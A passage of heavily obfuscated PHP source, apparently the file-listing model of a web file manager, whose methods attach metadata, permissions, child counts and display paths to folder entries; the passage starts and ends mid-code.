$_SERVER[Õİõş]; if (!isset($dì¿åÄøÎ[$b ñËŠá †[392]])) { $dì¿åÄøÎ[$b ñËŠá †[392]] = 0; } $Fˆ†Ä‰Æƒ– = $b ñËŠá †[393]; goto EÏ‚»©èÅİ; F…İõÖ•ëÎ: return $F‹Úæ¿“ğ; goto a×…©çÒ; EÏ‚»©èÅİ: $F‹Úæ¿“ğ = $this->field($Fˆ†Ä‰Æƒ–)->_makeOrder()->where($dì¿åÄøÎ)->selectPage($AÈ©Ü¢ö¤º); $this->_listDataApply($F‹Úæ¿“ğ[$b ñËŠá †[350]]); $this->_listMake($F‹Úæ¿“ğ); goto F…İõÖ•ëÎ; a×…©çÒ: } protected function _makeOrder() { goto AƒêäÎó÷À; A¤Ü©Œˆ†˜: $fãï–êˆ‰¨ = Input::get($D„½·¹ßŞç[403], $D„½·¹ßŞç[7], $A»´¦°Üğæ, array_keys($F³èæëğÀË)); if (!in_array($báãÎŠ£ºÎ, array_keys($aÓ°Ô¸Î’¨))) { $báãÎŠ£ºÎ = $D„½·¹ßŞç[28]; } if (!in_array($fãï–êˆ‰¨, array_keys($F³èæëğÀË))) { $báãÎŠ£ºÎ = $D„½·¹ßŞç[397]; } goto DĞÇ¦š»Ü”; AƒêäÎó÷À: $D„½·¹ßŞç =& $_SERVER[Õİõş]; $A²î¨àšø¿ = Model($D„½·¹ßŞç[394])->get($D„½·¹ßŞç[395]); $A»´¦°Üğæ = Model($D„½·¹ßŞç[394])->get($D„½·¹ßŞç[396]); goto FÓÍ«…¨Ô; DĞÇ¦š»Ü”: if ($báãÎŠ£ºÎ == $D„½·¹ßŞç[28]) { } $CÌ­Ú‹¤”” = $D„½·¹ßŞç[404] . $aÓ°Ô¸Î’¨[$báãÎŠ£ºÎ] . $D„½·¹ßŞç[50] . $F³èæëğÀË[$fãï–êˆ‰¨]; return $this->order(rtrim(trim($CÌ­Ú‹¤””), $D„½·¹ßŞç[47])); goto e†ÆË’Æ”; FÓÍ«…¨Ô: $F³èæëğÀË = array($D„½·¹ßŞç[397] => $D„½·¹ßŞç[398], $D„½·¹ßŞç[399] => $D„½·¹ßŞç[400]); $aÓ°Ô¸Î’¨ = array($D„½·¹ßŞç[28] => $D„½·¹ßŞç[28], $D„½·¹ßŞç[77] => $D„½·¹ßŞç[77], $D„½·¹ßŞç[156] => $D„½·¹ßŞç[368], $D„½·¹ßŞç[374] => $D„½·¹ßŞç[374], $D„½·¹ßŞç[401] => $D„½·¹ßŞç[375], $D„½·¹ßŞç[183] => $D„½·¹ßŞç[183], $D„½·¹ßŞç[106] => $D„½·¹ßŞç[106]); $báãÎŠ£ºÎ = Input::get($D„½·¹ßŞç[402], $D„½·¹ßŞç[7], $A²î¨àšø¿, array_keys($aÓ°Ô¸Î’¨)); goto A¤Ü©Œˆ†˜; e†ÆË’Æ”: } protected function _listDataApplyItem($B‹¡“šî®¼, $fŞëÖ§ÇçÆ = false) { $c—¡ô‡ˆŠô = array($B‹¡“šî®¼); $this->_listDataApply($c—¡ô‡ˆŠô, $fŞëÖ§ÇçÆ); return $c—¡ô‡ˆŠô[0]; } protected function _listDataApply(&$B’˜‡ŸŒİ, $BÚº±÷«Ÿ¼ = false) { goto eŒ®‰Æ; bàß¦Õ †: $this->_listAppendUser($B’˜‡ŸŒİ); $this->_listFilterInfo($B’˜‡ŸŒİ, $BÚº±÷«Ÿ¼); goto b¦ˆ™— ÒŠ; eŒ®‰Æ: $få¶«¾ƒŠÖ =& $_SERVER[Õİõş]; if (!$B’˜‡ŸŒİ) { $B’˜‡ŸŒİ = array(); return; } $fì¦„Ò÷ì = array_to_keyvalue($B’˜‡ŸŒİ, $få¶«¾ƒŠÖ[33], $få¶«¾ƒŠÖ[365]); goto E˜×ÂÕ¹²; E˜×ÂÕ¹²: $fì¦„Ò÷ì = array_unique($fì¦„Ò÷ì); $this->_listSourceCache($B’˜‡ŸŒİ); if (!$BÚº±÷«Ÿ¼) { $this->_listAppendMeta($B’˜‡ŸŒİ, $fì¦„Ò÷ì); $this->_listAppendFileMeta($B’˜‡ŸŒİ, $fì¦„Ò÷ì); $this->_listAppendChildren($B’˜‡ŸŒİ, $fì¦„Ò÷ì); } goto Eîöºí¨ÜŠ; Eîöºí¨ÜŠ: $this->_listAppendPath($B’˜‡ŸŒİ); $this->_listAppendAuth($B’˜‡ŸŒİ); $this->_listAppendSourceInfo($B’˜‡ŸŒİ, $fì¦„Ò÷ì); goto bàß¦Õ †; b¦ˆ™— ÒŠ: } protected function _listSourceCache($FïğˆĞ©Õ†) { $e±ÖŒ®»ÄÕ =& $_SERVER[Õİõş]; foreach ($FïğˆĞ©Õ† as $e‘Ö„ƒ‘Í) { self::$cacheSourceInfo[$e±ÖŒ®»ÄÕ[405] . $e‘Ö„ƒ‘Í[$e±ÖŒ®»ÄÕ[365]]] = $e‘Ö„ƒ‘Í; } } protected function _listFilterInfo(&$Bë¹Íœ†ÀÃ, $eİÅî›¥´ = false) { $c·¤Ç±¦¦ë =& $_SERVER[Õİõş]; foreach ($Bë¹Íœ†ÀÃ as &$Aä½…ÌêÁ) { $Aä½…ÌêÁ = $this->pathInfoFilter($Aä½…ÌêÁ); self::$cachePathInfo[$c·¤Ç±¦¦ë[406] . intval($eİÅî›¥´) . $c·¤Ç±¦¦ë[407] . $Aä½…ÌêÁ[$c·¤Ç±¦¦ë[365]]] = $Aä½…ÌêÁ; } } protected function _listMake(&$D´àÑÒ•·‡) { $A“ŠÜÓ¥À =& $_SERVER[Õİõş]; $D´àÑÒ•·‡[$A“ŠÜÓ¥À[74]] = array(); $D´àÑÒ•·‡[$A“ŠÜÓ¥À[73]] = array(); foreach ($D´àÑÒ•·‡[$A“ŠÜÓ¥À[350]] as $bã»”Ş«É³) { $Fë™âÑí× = $bã»”Ş«É³[$A“ŠÜÓ¥À[366]] == 1 ? $A“ŠÜÓ¥À[74] : $A“ŠÜÓ¥À[73]; $D´àÑÒ•·‡[$Fë™âÑí×][] = $bã»”Ş«É³; } unset($D´àÑÒ•·‡[$A“ŠÜÓ¥À[350]]); } protected function _listAppendMeta(&$C‘‡¦§©‚¨, $D…êÙîÉ¹) { goto AºÃŒ¯—¬; A´©íöò«: if (!$cÉ‡œ¬¶É†) { return; } $d—ˆ˜ñéÀ = array($Bî÷ø‰–ëÙ[410], $Bî÷ø‰–ëÙ[411]); $EÆ¾©‡¢Û = array(); goto cÚÍîïÖ; AºÃŒ¯—¬: $Bî÷ø‰–ëÙ =& $_SERVER[Õİõş]; $aâ™ñßÇ«ï = array($Bî÷ø‰–ëÙ[379] => array($Bî÷ø‰–ëÙ[380], $D…êÙîÉ¹)); $cÉ‡œ¬¶É† = Model($Bî÷ø‰–ëÙ[408])->field($Bî÷ø‰–ëÙ[409])->where($aâ™ñßÇ«ï)->select(); goto A´©íöò«; cÚÍîïÖ: foreach ($cÉ‡œ¬¶É† as $e‚Ó¢½…ÒÉ) { if (!isset($EÆ¾©‡¢Û[$e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[365]]])) { $EÆ¾©‡¢Û[$e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[365]]] = array(); } if (in_array($e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[89]], $d—ˆ˜ñéÀ)) { continue; } $EÆ¾©‡¢Û[$e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[365]]][$e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[89]]] = $e‚Ó¢½…ÒÉ[$Bî÷ø‰–ëÙ[355]]; } foreach ($C‘‡¦§©‚¨ as &$B”¯ù»’ï) { $B”¯ù»’ï[$Bî÷ø‰–ëÙ[412]] = !1; if (isset($EÆ¾©‡¢Û[$B”¯ù»’ï[$Bî÷ø‰–ëÙ[365]]])) { $B”¯ù»’ï[$Bî÷ø‰–ëÙ[412]] = $EÆ¾©‡¢Û[$B”¯ù»’ï[$Bî÷ø‰–ëÙ[365]]]; } if ($this->fileIsLock($B”¯ù»’ï) && $B”¯ù»’ï[$Bî÷ø‰–ëÙ[372]]) { $AÑìÑÕØÊÀ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B”¯ù»’ï[$Bî÷ø‰–ëÙ[372]][$Bî÷ø‰–ëÙ[373]] = AuthModel::authDisable($B”¯ù»’ï[$Bî÷ø‰–ëÙ[372]][$Bî÷ø‰–ëÙ[373]], $AÑìÑÕØÊÀ); $B”¯ù»’ï[$Bî÷ø‰–ëÙ[372]][$Bî÷ø‰–ëÙ[413]][$Bî÷ø‰–ëÙ[372]] = $B”¯ù»’ï[$Bî÷ø‰–ëÙ[372]][$Bî÷ø‰–ëÙ[373]]; } } goto B«¬Êó¿Ë¡; B«¬Êó¿Ë¡: } protected function _listAppendFileMeta(&$aÜ’Æ¶Ì¸Ş, $FàŞê­³¤­) { goto A½Â¦Ôí¤‡; BËÜÆ£Ü‡…: $FŠ‘¤›µ¬÷ = Model($B‚°â‚æš•[417])->field($f¸òîˆ±Ô)->where($Fİ®Ê¥ˆ·)->select(); $FŠ‘¤›µ¬÷ = array_to_keyvalue($FŠ‘¤›µ¬÷, $B‚°â‚æš•[414]); $CšÅ÷ñ = Model($B‚°â‚æš•[418])->field($B‚°â‚æš•[419])->where($Fİ®Ê¥ˆ·)->select(); goto dù ¼§Ëé½; d‹Ô¡ç½é: if (!$aßÕòÒ“¸³) { return; } $Fİ®Ê¥ˆ· = array($B‚°â‚æš•[415] => array($B‚°â‚æš•[380], $aßÕòÒ“¸³)); $f¸òîˆ±Ô = $B‚°â‚æš•[416]; goto BËÜÆ£Ü‡…; dù ¼§Ëé½: $CšÅ÷ñ = $CšÅ÷ñ ? $CšÅ÷ñ : array(); $dºÜŠ°¸ºè = array(); foreach ($CšÅ÷ñ as $CÕ“äÃÊ¸æ) { if (!isset($dºÜŠ°¸ºè[$CÕ“äÃÊ¸æ[$B‚°â‚æš•[414]]])) { $dºÜŠ°¸ºè[$CÕ“äÃÊ¸æ[$B‚°â‚æš•[414]]] = array(); } $dºÜŠ°¸ºè[$CÕ“äÃÊ¸æ[$B‚°â‚æš•[414]]][$CÕ“äÃÊ¸æ[$B‚°â‚æš•[89]]] = $CÕ“äÃÊ¸æ[$B‚°â‚æš•[355]]; } goto B”¼ÓëÙ¬; B”¼ÓëÙ¬: foreach ($aÜ’Æ¶Ì¸Ş as &$fòÙ¿ÕÔéè) { goto bÎÒğœ½ó; bÎÒğœ½ó: $D©èöÛõšô = $fòÙ¿ÕÔéè[$B‚°â‚æš•[414]]; if (!$D©èöÛõšô || !isset($FŠ‘¤›µ¬÷[$D©èöÛõšô])) { continue; } $bêîÖ–Š = $FŠ‘¤›µ¬÷[$D©èöÛõšô]; goto A°Ã…áİ³; C‡„¹½: if (isset($fòÙ¿ÕÔéè[$B‚°â‚æš•[158]][$B‚°â‚æš•[421]])) { $fòÙ¿ÕÔéè[$B‚°â‚æš•[421]] = json_decode($fòÙ¿ÕÔéè[$B‚°â‚æš•[158]][$B‚°â‚æš•[421]], !0); unset($fòÙ¿ÕÔéè[$B‚°â‚æš•[158]][$B‚°â‚æš•[421]]); } goto B×›º—‡Ïä; F·¶âÚ‚½¥: unset($FŠ‘¤›µ¬÷[$D©èöÛõšô][$B‚°â‚æš•[75]]); $dÌ©ĞÆ®Ì = is_array($dºÜŠ°¸ºè[$D©èöÛõšô]) ? $dºÜŠ°¸ºè[$D©èöÛõšô] : array(); $fòÙ¿ÕÔéè[$B‚°â‚æš•[158]] = array_merge($dÌ©ĞÆ®Ì, $FŠ‘¤›µ¬÷[$D©èöÛõšô]); goto C‡„¹½; A°Ã…áİ³: $bêîÖ–Š[$B‚°â‚æš•[77]] = $fòÙ¿ÕÔéè[$B‚°â‚æš•[77]]; $bêîÖ–Š[$B‚°â‚æš•[28]] = $fòÙ¿ÕÔéè[$B‚°â‚æš•[28]]; self::$cacheFileInfo[$B‚°â‚æš•[420] . $D©èöÛõšô] = $bêîÖ–Š; goto F·¶âÚ‚½¥; B×›º—‡Ïä: } goto e³æª²Ç¼¿; A½Â¦Ôí¤‡: $B‚°â‚æš• =& $_SERVER[Õİõş]; $aßÕòÒ“¸³ = array_to_keyvalue($aÜ’Æ¶Ì¸Ş, $B‚°â‚æš•[33], $B‚°â‚æš•[414]); $aßÕòÒ“¸³ = array_filter(array_unique($aßÕòÒ“¸³)); goto d‹Ô¡ç½é; e³æª²Ç¼¿: } protected function _listAppendSourceInfo(&$C‚è†­À†­, $E¦Ü¶æ³ƒœ) { goto e¯Ìˆï²Ë±; eÛŠòìÉˆ•: $aô‡ô°ÎÙÖ = Model($fŠìˆ‡’¯[388])->listData(); $fõ¾¢™‹ÑÚ = Model($fŠìˆ‡’¯[377])->listData(); $CøØ…ŞÛàĞ = Model($fŠìˆ‡’¯[424])->listSimple(); goto bÄ¦‘¨ñÑ; a±±µÜñšŒ: $F›‘Ìê‘Û = array_to_keyvalue_group($CøØ…ŞÛàĞ, $fŠìˆ‡’¯[365]); foreach ($C‚è†­À†­ as &$cÒñï–Áğé) { $cÒñï–Áğé[$fŠìˆ‡’¯[387]] = array($fŠìˆ‡’¯[425] => 0, $fŠìˆ‡’¯[426] => 0, $fŠìˆ‡’¯[427] => 0); if (isset($Eë…„·İ‘‡[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]])) { $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[428]] = 1; $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[429]] = $Eë…„·İ‘‡[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]][$fŠìˆ‡’¯[28]]; } if (isset($aÆÑÑğÔ´Â[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]])) { $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[430]] = array(); foreach ($aÆÑÑğÔ´Â[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]] as $d÷‰ºÁµ‚à) { $b‚À÷›‚Æ = $e°ôÃŠÚµ[$d÷‰ºÁµ‚à]; $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[430]][] = array($fŠìˆ‡’¯[431] => $b‚À÷›‚Æ[$fŠìˆ‡’¯[363]], $fŠìˆ‡’¯[382] => $b‚À÷›‚Æ[$fŠìˆ‡’¯[28]], $fŠìˆ‡’¯[432] => $b‚À÷›‚Æ[$fŠìˆ‡’¯[433]]); } } if (isset($F›‘Ìê‘Û[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]])) { $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[434]] = array(); foreach ($F›‘Ìê‘Û[$cÒñï–Áğé[$fŠìˆ‡’¯[365]]] as $bì¸‚Âñêˆ) { $cÒñï–Áğé[$fŠìˆ‡’¯[387]][$fŠìˆ‡’¯[434]] = array($fŠìˆ‡’¯[435] => $bì¸‚Âñêˆ[$fŠìˆ‡’¯[436]], $fŠìˆ‡’¯[437] => $bì¸‚Âñêˆ[$fŠìˆ‡’¯[438]], $fŠìˆ‡’¯[439] => $bì¸‚Âñêˆ[$fŠìˆ‡’¯[365]], $fŠìˆ‡’¯[440] => $bì¸‚Âñêˆ[$fŠìˆ‡’¯[441]], $fŠìˆ‡’¯[442] => $bì¸‚Âñêˆ[$fŠìˆ‡’¯[443]]); } } } return $C‚è†­À†­; goto b†çÎŒ®å»; bÄ¦‘¨ñÑ: $e°ôÃŠÚµ = array_to_keyvalue($Bù‹‰ÚéÉ, $fŠìˆ‡’¯[363]); $aÆÑÑğÔ´Â = array_to_keyvalue_group($aô‡ô°ÎÙÖ, $fŠìˆ‡’¯[75], $fŠìˆ‡’¯[389]); $Eë…„·İ‘‡ = array_to_keyvalue($fõ¾¢™‹ÑÚ, $fŠìˆ‡’¯[75]); goto a±±µÜñšŒ; e¯Ìˆï²Ë±: $fŠìˆ‡’¯ =& $_SERVER[Õİõş]; if (!defined($fŠìˆ‡’¯[422])) { return; } $Bù‹‰ÚéÉ = Model($fŠìˆ‡’¯[423])->listData(); goto eÛŠòìÉˆ•; b†çÎŒ®å»: } protected function _listAppendChildren(&$DÌÃŒÆÌ¹ª, $F¾ìÎ¾ÂŠ¬) { goto dãÉÜ…ä; cœÆï¢Š: foreach ($DÌÃŒÆÌ¹ª as &$D£â”ô› ê) { if ($D£â”ô› ê[$a°ò’® ¶×[366]]) { unset($D£â”ô› ê[$a°ò’® ¶×[368]]); $D£â”ô› ê[$a°ò’® ¶×[188]] = intval($CÍèË‡îŒ[$D£â”ô› ê[$a°ò’® ¶×[365]] . $a°ò’® ¶×[446]][$a°ò’® ¶×[447]]); $D£â”ô› ê[$a°ò’® ¶×[187]] = intval($CÍèË‡îŒ[$D£â”ô› ê[$a°ò’® ¶×[365]] . $a°ò’® ¶×[448]][$a°ò’® ¶×[447]]); } } goto B‡ïÖ…î; dãÉÜ…ä: $a°ò’® ¶× =& $_SERVER[Õİõş]; $E‡’¸“Ãò = $a°ò’® ¶×[357]; $CÍèË‡îŒ = array(); goto A‡Å©·¾¨; E¨Â–™ºÓè: $D“©µ¬‚…Ì = $this->tablePrefix . $this->tableName; for ($B¢‘½ªâ½ = 0; $B¢‘½ªâ½ < $BÊ¯‚¯áä; $B¢‘½ªâ½++) { $EùóøÃë× = intval($DÌÃŒÆÌ¹ª[$B¢‘½ªâ½][$a°ò’® ¶×[392]]); if ($DÌÃŒÆÌ¹ª[$B¢‘½ªâ½][$a°ò’® ¶×[366]]) { $BÍˆ¨¯é¼ = $DÌÃŒÆÌ¹ª[$B¢‘½ªâ½][$a°ò’® ¶×[365]]; $E‡’¸“Ãò .= "\x53\x45\114\105\103\124\40\52\40\106\122\x4f\115\x20\x28\123\x45\114\x45\x43\x54\40\47{$BÍˆ¨¯é¼}\x5f\150\141\x73\106\151\154\x65\x27\x20\141\x73\40\150\x61\163\54\x63\157\165\x6e\164\x28\61\51\x20\x61\163\x20\150\141\163\x43\157\x75\x6e\x74\x20\x46\x52\117\x4d\40\140{$D“©µ¬‚…Ì}\x60\x20\12\x9\11\x9\11\x9\167\150\145\162\x65\x20\160\x61\x72\x65\156\x74\x49\x44\x3d{$BÍˆ¨¯é¼}\40\x61\156\144\40\x69\x73\106\x6f\154\x64\x65\162\75\60\40\x61\156\144\x20\151\x73\x44\x65\x6c\145\164\145\75{$EùóøÃë×}\x29\x20\141\163\x20\164\142\x31\137{$BÍˆ¨¯é¼}\x20\165\x6e\151\157\156\x20\141\x6c\x6c\40\12\x9\11\11\x9\11\123\x45\x4c\x45\x43\124\x20\52\x20\106\122\x4f\115\40\x28\x53\105\114\x45\103\124\40\47{$BÍˆ¨¯é¼}\x5f\150\141\x73\106\157\154\x64\x65\x72\x27\x20\141\x73\40\150\x61\163\x46\151\x6c\x65\54\143\157\165\x6e\x74\50\x31\x29\x20\141\x73\x20\x68\141\163\x43\x6f\165\x6e\x74\x20\106\122\x4f\x4d\40\x60{$D“©µ¬‚…Ì}\140\40\12\11\x9\x9\11\x9\x77\x68\x65\162\145\40\x70\141\x72\x65\156\164\x49\x44\75{$BÍˆ¨¯é¼}\x20\x61\156\144\x20\x69\x73\x46\x6f\154\144\x65\162\75\61\x20\x61\x6e\x64\40\x69\163\x44\145\x6c\145\x74\x65\x3d{$EùóøÃë×}\x29\40\x61\x73\40\x74\142\x32\x5f{$BÍˆ¨¯é¼}\x20\165\x6e\x69\x6f\x6e\40\x61\x6c\x6c\40"; } if ((strlen($E‡’¸“Ãò) >= $B­ÚÌ»ò›° || $B¢‘½ªâ½ == $BÊ¯‚¯áä - 1) && $E‡’¸“Ãò) { $E‡’¸“Ãò = substr($E‡’¸“Ãò, 0, -strlen($a°ò’® ¶×[444])); $Eó¯š¢ÊÂ = $this->query($E‡’¸“Ãò); $CÍèË‡îŒ = array_merge($CÍèË‡îŒ, $Eó¯š¢ÊÂ); $E‡’¸“Ãò = $a°ò’® ¶×[33]; } } $CÍèË‡îŒ = array_to_keyvalue($CÍèË‡îŒ, $a°ò’® ¶×[445]); goto cœÆï¢Š; A‡Å©·¾¨: $B­ÚÌ»ò›° = 1024 * 50; $DÌÃŒÆÌ¹ª = is_array($DÌÃŒÆÌ¹ª) ? $DÌÃŒÆÌ¹ª : array(); $BÊ¯‚¯áä = count($DÌÃŒÆÌ¹ª); goto E¨Â–™ºÓè; B‡ïÖ…î: } protected function _listAppendAuth(&$Eã½ß£¢›ô) { goto Bñè… È’Ô; Bñè… È’Ô: $cÖÑ¶ÖµèŠ =& $_SERVER[Õİõş]; if (!defined($cÖÑ¶ÖµèŠ[422])) { return; } $bö»ì÷î»¾ = array(); goto aà‡‹±›£‘; aà‡‹±›£‘: foreach ($Eã½ß£¢›ô as $b¥­§¤æà¯) { if ($b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[367]] == self::TYPE_GROUP) { $bö»ì÷î»¾[] = $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[365]]; } } if (!$bö»ì÷î»¾) { return; } $a©É°ØÃ¥ƒ = array_to_keyvalue($Eã½ß£¢›ô, $cÖÑ¶ÖµèŠ[365]); goto EÆ‹ÈÙ‹À; EÆ‹ÈÙ‹À: $AïÈ¿ô®ãÚ = Model($cÖÑ¶ÖµèŠ[449])->getSourceList($bö»ì÷î»¾, $a©É°ØÃ¥ƒ); foreach ($Eã½ß£¢›ô as $e‚ƒ±åÍ†ˆ => &$b¥­§¤æà¯) { $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]] = $AïÈ¿ô®ãÚ[$b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[365]]]; if (!$b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]] && $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[367]] == self::TYPE_GROUP) { $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]] = Action($cÖÑ¶ÖµèŠ[450])->pathGroupAuthMake($b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[451]]); if (!$b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]] && !_get($GLOBALS, $cÖÑ¶ÖµèŠ[452])) { $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[185]] = !1; $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[184]] = !1; } } if ($b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]]) { $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[185]] = AuthModel::authCheckEdit($b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]][$cÖÑ¶ÖµèŠ[373]]); $b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[184]] = AuthModel::authCheckView($b¥­§¤æà¯[$cÖÑ¶ÖµèŠ[372]][$cÖÑ¶ÖµèŠ[373]]); } $this->groupPathDisplay($b¥­§¤æà¯); } goto A·áÂäå; A·áÂäå: } public function groupPathDisplay(&$AŸŸ©¸Ñ) { goto E­´ †ğœ‘; Cåš‹„ÕíÜ: $AŸŸ©¸Ñ[$E¢º¥ÅØ§[459]] = $fÉùáÑå«Á . $aàĞÑé“Ö[$E¢º¥ÅØ§[387]][$E¢º¥ÅØ§[365]]; goto c†Ó×˜ØĞå; BÍÛíì½†ã: $AŸŸ©¸Ñ[$E¢º¥ÅØ§[455]] = $aàĞÑé“Ö[$E¢º¥ÅØ§[456]]; $AŸŸ©¸Ñ[$E¢º¥ÅØ§[376]] = $aàĞÑé“Ö[$E¢º¥ÅØ§[454]]; $AŸŸ©¸Ñ[$E¢º¥ÅØ§[457]] = $aàĞÑé“Ö[$E¢º¥ÅØ§[458]]; goto Cåš‹„ÕíÜ; AÑ‡É­Üí¼: $DÇÂÇëÜÚË = $this->parentLevelArray($aàĞÑé“Ö[$E¢º¥ÅØ§[454]]); $fÉùáÑå«Á = $E¢º¥ÅØ§[33]; foreach ($DÇÂÇëÜÚË as $B”÷ìù§½) { $AŠà—¼½ğ· = Model($E¢º¥ÅØ§[453])->getInfo($B”÷ìù§½); $fÉùáÑå«Á .= $AŠà—¼½ğ·[$E¢º¥ÅØ§[387]][$E¢º¥ÅØ§[365]] . $E¢º¥ÅØ§[47]; } goto BÍÛíì½†ã; E­´ †ğœ‘: $E¢º¥ÅØ§ =& $_SERVER[Õİõş]; if ($AŸŸ©¸Ñ[$E¢º¥ÅØ§[367]] != self::TYPE_GROUP) { return; } $aàĞÑé“Ö = Model($E¢º¥ÅØ§[453])->getInfo($AŸŸ©¸Ñ[$E¢º¥ÅØ§[451]]); goto AÑ‡É­Üí¼; c†Ó×˜ØĞå: } protected function _listAppendPath(&$dÙõÒ÷ÆÑ) { goto FÑ¾©Õº¹; FÑ¾©Õº¹: $aÈéÕœä˜‚ =& $_SERVER[Õİõş]; $Dä”òÆ«§† = array(); foreach ($dÙõÒ÷ÆÑ as &$a¬âœÇğĞš) { $Dä”òÆ«§†[$a¬âœÇğĞš[$aÈéÕœä˜‚[365]]] = $a¬âœÇğĞš[$aÈéÕœä˜‚[28]]; $fÏ‰Øë— = $this->parentLevelArray($a¬âœÇğĞš[$aÈéÕœä˜‚[454]]); array_shift($fÏ‰Øë—); foreach ($fÏ‰Øë— as $C†é¥¶ÚÅà) { if (!isset($Dä”òÆ«§†[$C†é¥¶ÚÅà])) { $Dä”òÆ«§†[$C†é¥¶ÚÅà] = 0; } } } goto eõŠ¡‚í„È; eõŠ¡‚í„È: $F°ìëöÆ‰ = array(); foreach ($Dä”òÆ«§† as $c”íèÑ‚¯ => $Eğİ¹çäÊ³) { if (!$Eğİ¹çäÊ³) { $F°ìëöÆ‰[] = $c”íèÑ‚¯; } } if ($F°ìëöÆ‰) { $c‰Ó±Šö = array($aÈéÕœä˜‚[379] => array($aÈéÕœä˜‚[380], $F°ìëöÆ‰)); if (count($F°ìëöÆ‰) == 1) { $aÏ ‡Í¶‘ = $this->sourceInfo($F°ìëöÆ‰[0]); $aÏ ‡Í¶‘ = is_array($aÏ ‡Í¶‘) ? array($aÏ ‡Í¶‘) : !1; } else { $aÏ ‡Í¶‘ = $this->field($aÈéÕœä˜‚[460])->where($c‰Ó±Šö)->select(); } $bÕ‚Çõ’ê = array_to_keyvalue($aÏ ‡Í¶‘, $aÈéÕœä˜‚[365], $aÈéÕœä˜‚[28]); $Dä”òÆ«§† = array_merge_index($Dä”òÆ«§†, $bÕ‚Çõ’ê); } goto fƒªĞ‰×ÙÖ; fƒªĞ‰×ÙÖ: $cÚø‰Áà÷ˆ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($dÙõÒ÷ÆÑ as &$a¬âœÇğĞš) { goto aƒå›¹ä­; aƒå›¹ä­: $fÏ‰Øë— = $this->parentLevelArray($a¬âœÇğĞš[$aÈéÕœä˜‚[454]]); $bŒ¦ùÔİ“¸ = $this->_listAppendPathRoot($a¬âœÇğĞš, $fÏ‰Øë—); foreach ($fÏ‰Øë— as $C†é¥¶ÚÅà) { if (isset($Dä”òÆ«§†[$C†é¥¶ÚÅà])) { $bŒ¦ùÔİ“¸ .= $Dä”òÆ«§†[$C†é¥¶ÚÅà] . $aÈéÕœä˜‚[8]; } } goto B’¨É£ ç; B’¨É£ ç: if ($fÏ‰Øë—) { $bŒ¦ùÔİ“¸ .= $a¬âœÇğĞš[$aÈéÕœä˜‚[28]]; } if ($a¬âœÇğĞš[$aÈéÕœä˜‚[366]]) { $bŒ¦ùÔİ“¸ .= $aÈéÕœä˜‚[8]; } $a¬âœÇğĞš[$aÈéÕœä˜‚[461]] = str_replace($aÈéÕœä˜‚[462], $aÈéÕœä˜‚[8], $bŒ¦ùÔİ“¸); goto Fİ¨’Ÿ×¥£; Fİ¨’Ÿ×¥£: $Fğ°¡âÍĞß = trim($a¬âœÇğĞš[$aÈéÕœä˜‚[461]], $aÈéÕœä˜‚[8]); if ($a¬âœÇğĞš[$aÈéÕœä˜‚[456]] == $aÈéÕœä˜‚[463] && $Fğ°¡âÍĞß) { $a¬âœÇğĞš[$aÈéÕœä˜‚[28]] = $Fğ°¡âÍĞß; } $this->_listAppendPathRecycle($a¬âœÇğĞš, $fÏ‰Øë—, $cÚø‰Áà÷ˆ); goto BÖ”¤“áùì; BÖ”¤“áùì: } goto b•ÚÇïÁ¦; b•ÚÇïÁ¦: } private function _listAppendPathRecycle(&$AÃáôõÙÎ‹, $EÚÀÕó®´Ë, $fø·‹é¹) { goto b…¬‰° ´ì; cÙİ‰÷ùÚÃ: $CÂÁ„À¿ª„ = explode($eÉá‰è†‡Ç[8], trim($AÃáôõÙÎ‹[$eÉá‰è†‡Ç[461]], $eÉá‰è†‡Ç[8])); $e°‹ôáæİª = implode($eÉá‰è†‡Ç[8], array_slice($CÂÁ„À¿ª„, 2)); $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[461]] = $eÉá‰è†‡Ç[8] . LNG($eÉá‰è†‡Ç[464]) . $eÉá‰è†‡Ç[8] . ltrim($e°‹ôáæİª, $eÉá‰è†‡Ç[8]); goto B©¼Äæîİ; B©¼Äæîİ: $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[454]] = $eÉá‰è†‡Ç[465] . implode($eÉá‰è†‡Ç[47], array_slice($EÚÀÕó®´Ë, 1)) . $eÉá‰è†‡Ç[47]; if ($AÃáôõÙÎ‹[$eÉá‰è†‡Ç[365]] == $fø·‹é¹) { $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[454]] = $eÉá‰è†‡Ç[465]; $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[456]] = $eÉá‰è†‡Ç[463]; $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[28]] = LNG($eÉá‰è†‡Ç[464]); } $AÃáôõÙÎ‹[$eÉá‰è†‡Ç[466]] = 